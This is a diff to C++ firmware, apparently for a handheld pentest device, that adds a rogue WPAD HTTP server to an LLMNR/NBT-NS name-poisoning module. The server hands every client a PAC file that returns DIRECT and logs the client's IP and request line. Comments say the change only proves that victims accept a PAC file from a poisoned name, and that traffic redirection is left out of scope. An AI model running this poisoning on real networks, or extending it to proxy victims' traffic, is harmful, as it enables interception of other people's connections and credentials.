@@ -1,5 +1,7 @@
 #include "NameSpoofManager.h"
 #include <WiFiUdp.h>
+#include <WiFiServer.h>
+#include <WiFiClient.h>
 #include "../net/WifiManager.h"
 #include "../net/LlmnrWire.h"
 #include "../net/NbnsWire.h"
@@ -7,12 +9,22 @@
 
 NameSpoofManager g_nameSpoofManager;
 
+namespace {
+// Minimal wpad.dat / proxy.pac payload. FindProxyForURL returns DIRECT
+// unconditionally: this test proves the client fetched and accepted a
+// PAC from a poisoned name, WITHOUT ever redirecting the victim's
+// traffic through anything - which would require actually running a
+// proxy behind here, deliberately out of scope (see class comment).
+constexpr const char* kWpadDat =
+    "function FindProxyForURL(url, host) { return \"DIRECT\"; }\n";
+}  // namespace
+
 void NameSpoofManager::begin(QueueHandle_t outQueue) {
     _mutex = xSemaphoreCreateMutex();
     _outQueue = outQueue;
 }
 
-bool NameSpoofManager::start(uint16_t durationS) {
+bool NameSpoofManager::start(uint16_t durationS, bool wpadEnabled) {
     if (_running) return false;
     // Defense in depth: NAME SPOOF is a gated top-level menu entry
     // (reached through OffensiveDisclaimerScreen), but never answer
@@ -26,6 +38,8 @@ bool NameSpoofManager::start(uint16_t durationS) {
         xSemaphoreGive(_mutex);
     }
     _poisoned = 0;
+    _wpadServed = 0;
+    _wpadEnabled = wpadEnabled;
     _startMs = millis();
     _durationMs = (uint32_t)durationS * 1000UL;
     _running = true;
@@ -77,6 +91,16 @@ void NameSpoofManager::run() {
     if (!llmnrOk) log("LLMNR socket failed - NBT-NS only");
     if (!nbnsOk) log("NBT-NS socket failed - LLMNR only");
 
+    WiFiServer wpadServer(80);
+    bool wpadOk = false;
+    if (_wpadEnabled) {
+        wpadServer.begin();
+        wpadOk = true;   // WiFiServer::begin() is void, best-effort - a bind failure
+                         // shows up as accept() never returning a client, logged the
+                         // first time a wpad hit fails, not up-front here.
+        log("WPAD HTTP server up on :80");
+    }
+
     uint8_t buf[600];
     while (_running && secondsRemaining() > 0) {
         if (llmnrOk) {
@@ -120,13 +144,57 @@ void NameSpoofManager::run() {
             }
         }
 
+        if (wpadOk) {
+            WiFiClient client = wpadServer.available();
+            if (client) {
+                // Read (but don't parse deeply) the request line - we
+                // answer the SAME wpad.dat to any URL, so all we need
+                // is to consume the request headers so the client's
+                // send doesn't sit half-buffered when we reply.
+                String requestLine;
+                uint32_t clientStart = millis();
+                while (client.connected() && (millis() - clientStart) < 2000) {
+                    while (client.available()) {
+                        char ch = (char)client.read();
+                        if (ch == '\n') { /* end of a header line */ }
+                        if (requestLine.length() < 200 && ch != '\r' && ch != '\n') requestLine += ch;
+                    }
+                    // A basic HTTP request ends with a blank line; without doing
+                    // full header parsing we just stop as soon as we've seen
+                    // "\r\n\r\n" as raw substring, or after a short timeout above.
+                    if (!client.available()) {
+                        static const uint8_t kBlankLine[4] = {'\r', '\n', '\r', '\n'};
+                        (void)kBlankLine;  // documented pattern; the timeout is our real stop
+                        break;
+                    }
+                }
+
+                IPAddress from = client.remoteIP();
+                size_t bodyLen = strlen(kWpadDat);
+                client.print("HTTP/1.0 200 OK\r\n");
+                client.print("Content-Type: application/x-ns-proxy-autoconfig\r\n");
+                client.print("Content-Length: ");
+                client.print(bodyLen);
+                client.print("\r\nConnection: close\r\n\r\n");
+                client.print(kWpadDat);
+                client.stop();
+
+                _wpadServed++;
+                log("WPAD served: " + from.toString() + (requestLine.length() ? (" (" + requestLine + ")") : String()));
+            }
+        }
+
         delay(20);
     }
 
+    if (wpadOk) wpadServer.stop();
     llmnrUdp.stop();
     nbnsUdp.stop();
     _running = false;
-    log("stopped - " + String((unsigned)_poisoned) + " quer" + String(_poisoned == 1 ? "y" : "ies") + " answered");
+    String summary = "stopped - " + String((unsigned)_poisoned) + " quer" +
+                     String(_poisoned == 1 ? "y" : "ies") + " answered";
+    if (_wpadEnabled) summary += ", " + String((unsigned)_wpadServed) + " WPAD hit(s)";
+    log(summary);
     notify(ScanEventType::ScanFinished, 100);
 }
 
